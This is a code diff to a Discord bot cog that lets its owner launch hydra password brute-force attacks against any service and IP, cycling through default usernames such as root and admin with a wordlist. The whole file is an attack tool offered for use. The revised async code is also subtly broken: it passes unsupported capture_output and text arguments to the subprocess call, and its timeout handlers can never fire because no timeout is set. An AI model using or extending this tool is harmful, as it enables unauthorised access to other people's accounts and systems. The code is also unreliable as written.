@@ -1,4 +1,4 @@
-import subprocess
+import shlex
 import asyncio
 import logging
 from discord.ext import commands
@@ -12,19 +12,16 @@ class BruteForce(commands.Cog):
     async def run_hydra(self, usernames, password_file, service, target_ip):
         results = []
         for username in usernames:
-            command = [
-                'hydra',
-                '-l', username,
-                '-P', password_file,
-                f"{service}://{target_ip}"
-            ]
+            command = f"hydra -l {username} -P {password_file} {service}://{target_ip}"
+            args = shlex.split(command)
             try:
-                result = subprocess.run(command, capture_output=True, text=True, timeout=10)
-                if "1 valid password found" in result.stdout:
+                process = await asyncio.create_subprocess_exec(*args, capture_output=True, text=True)
+                stdout, stderr = await process.communicate()
+                if "1 valid password found" in stdout:
                     results.append(f"Success: {username} - {password_file}")
                 else:
                     results.append(f"Failed: {username} - {password_file}")
-            except subprocess.TimeoutExpired:
+            except asyncio.TimeoutError:
                 results.append(f"Timeout: {username} - {password_file}")
             await asyncio.sleep(1)
         return results
@@ -33,11 +30,13 @@ class BruteForce(commands.Cog):
     @commands.is_owner()
     async def brute(self, ctx, service: str, target_ip: str):
         try:
-            usernames = ['root', 'admin', 'user', 'guest', 'administrator']
+            usernames = ['root', 'admin', 'user', 'administrator']
             password_file = 'wordlist.txt'
 
             results = await self.run_hydra(usernames, password_file, service, target_ip)
             await ctx.send(f"Results:\n{'\n'.join(results)}")
+        except asyncio.TimeoutError:
+            await ctx.send("Timeout error occurred. Please try again later.")
         except Exception as e:
             await ctx.send("An error occurred while executing brute. Please try again later.")
 
